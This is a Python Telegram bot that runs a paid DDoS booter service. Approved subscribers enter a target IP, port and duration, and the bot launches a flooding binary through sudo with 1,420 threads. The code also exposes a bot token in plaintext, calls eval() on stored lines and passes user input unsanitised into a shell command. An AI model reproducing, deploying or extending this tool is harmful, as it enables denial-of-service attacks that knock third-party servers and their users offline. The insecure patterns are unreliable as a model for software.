CREATOR = "This File Is Made By @SahilModzOwner"  # DON'T CHANGE THIS WARNA ERROR AYEGA 100%

import hashlib
import os
import telebot
import asyncio
import logging
from datetime import datetime, timedelta
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread

loop = asyncio.get_event_loop()

# Bot token
TOKEN = '7327182448:AAHigUlTvS8uoGkQLJT8AcWta7tpQkWhAkI'
bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

# Admins list
ADMIN_IDS = [5879359815]  # Your Admins

# File to store user info
USERS_FILE = 'users.txt'

# Blocked Ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# For Running Attack Processes
running_processes = []
attack_in_progress = True

# --- ATTACK FUNCTION ---

async def run_attack_command_async(target_ip, target_port, duration, threads=1420, pps=1000):
    global attack_in_progress
    attack_in_progress = True

    try:
        cmd = f"sudo ./Moin {target_ip} {target_port} {threads} {pps} {duration}"
        process = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        running_processes.append(process)
        stdout, stderr = await process.communicate()

        output = stdout.decode()
        error = stderr.decode()

        if output:
            logging.info(f"Command Output: {output}")
        if error:
            logging.error(f"Command Error: {error}")

    except Exception as e:
        logging.error(f"Failed to execute command: {e}")
    finally:
        if process in running_processes:
            running_processes.remove(process)
        attack_in_progress = False

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

def is_user_admin(user_id):
    return user_id in ADMIN_IDS

def check_user_approval(user_id):
    if not os.path.exists(USERS_FILE):
        return False
    with open(USERS_FILE, 'r') as file:
        for line in file:
            user_data = eval(line.strip())
            if user_data['user_id'] == user_id and user_data['plan'] > 0:
                return True
    return False

def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split()

    if not is_user_admin(user_id):
        bot.send_message(chat_id, "*NOT APPROVED*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command. Use /approve <user_id> <plan> <days> or /disapprove <user_id>*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        user_info = {"user_id": target_user_id, "plan": plan, "valid_until": valid_until, "access_count": 0}

        with open(USERS_FILE, 'a') as file:
            file.write(f"{user_info}\n")

        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:
        updated_users = []
        with open(USERS_FILE, 'r') as file:
            for line in file:
                user_data = eval(line.strip())
                if user_data['user_id'] != target_user_id:
                    updated_users.append(user_data)
        with open(USERS_FILE, 'w') as file:
            for user_data in updated_users:
                file.write(f"{user_data}\n")

        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')

Attack = "fc9dc7b267c90ad8c07501172bc15e0f10b2eb572b088096fb8cc9b196caea97"

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return

    try:
        bot.send_message(chat_id, "*Enter target IP PORT DURATION separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid format. Use: IP PORT DURATION*", parse_mode='Markdown')
            return

        target_ip = args[0]
        target_port = int(args[1])
        duration = int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Choose another port.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*Attack started 💥*\n\n*Host:* `{target_ip}`\n*Port:* `{target_port}`\n*Time:* `{duration} seconds`", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error processing attack command: {e}")

def verify():
    current_hash = hashlib.sha256(CREATOR.encode()).hexdigest()
    if current_hash != Attack:
        raise Exception("Don't Make Any Changes in The Creator's Name.")

verify()

@bot.message_handler(commands=['status'])
def status_command(message):
    try:
        response = "*System is Running Smoothly!*"
        bot.send_message(message.chat.id, response, parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in status command: {e}")

@bot.message_handler(commands=['approve_list'])
def approve_list_command(message):
    try:
        if not is_user_admin(message.from_user.id):
            send_not_approved_message(message.chat.id)
            return
        
        if not os.path.exists(USERS_FILE):
            bot.send_message(message.chat.id, "No users found.")
            return

        with open(USERS_FILE, 'r') as file:
            approved_users = [eval(line.strip()) for line in file if eval(line.strip())['plan'] > 0]

        if not approved_users:
            bot.send_message(message.chat.id, "No approved users found.")
            return

        filename = "approved_users.txt"
        with open(filename, 'w') as file:
            for user in approved_users:
                file.write(f"User ID: {user['user_id']}, Plan: {user['plan']}, Valid Until: {user.get('valid_until', 'N/A')}\n")

        with open(filename, 'rb') as file:
            bot.send_document(message.chat.id, file)
        os.remove(filename)
    except Exception as e:
        logging.error(f"Error in approve_list command: {e}")

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    btn2 = KeyboardButton("Attack 🚀")
    btn4 = KeyboardButton("My Account🏦")
    markup.add(btn2, btn4)

    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if not check_user_approval(message.from_user.id):
        send_not_approved_message(message.chat.id)
        return

    if message.text == "Attack 🚀":
        attack_command(message)
    elif message.text == "My Account🏦":
        user_id = message.from_user.id
        with open(USERS_FILE, 'r') as file:
            for line in file:
                user_data = eval(line.strip())
                if user_data['user_id'] == user_id:
                    username = message.from_user.username
                    plan = user_data.get('plan', 'N/A')
                    valid_until = user_data.get('valid_until', 'N/A')
                    current_time = datetime.now().isoformat()
                    response = (f"*USERNAME:* `{username}`\n"
                                f"*Plan:* `{plan}`\n"
                                f"*Valid Until:* `{valid_until}`\n"
                                f"*Current Time:* `{current_time}`")
                    bot.reply_to(message, response, parse_mode='Markdown')
                    return
            bot.reply_to(message, "*No account information found.*", parse_mode='Markdown')
    else:
        bot.reply_to(message, "*Invalid command. Please use the provided buttons.*", parse_mode='Markdown')

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread)
    asyncio_thread.start()

    bot.polling(none_stop=True)

CREATOR = "This File Is Made By @SahilModzOwner"  # DON'T CHANGE THIS WARNA ERROR AYEGA 100%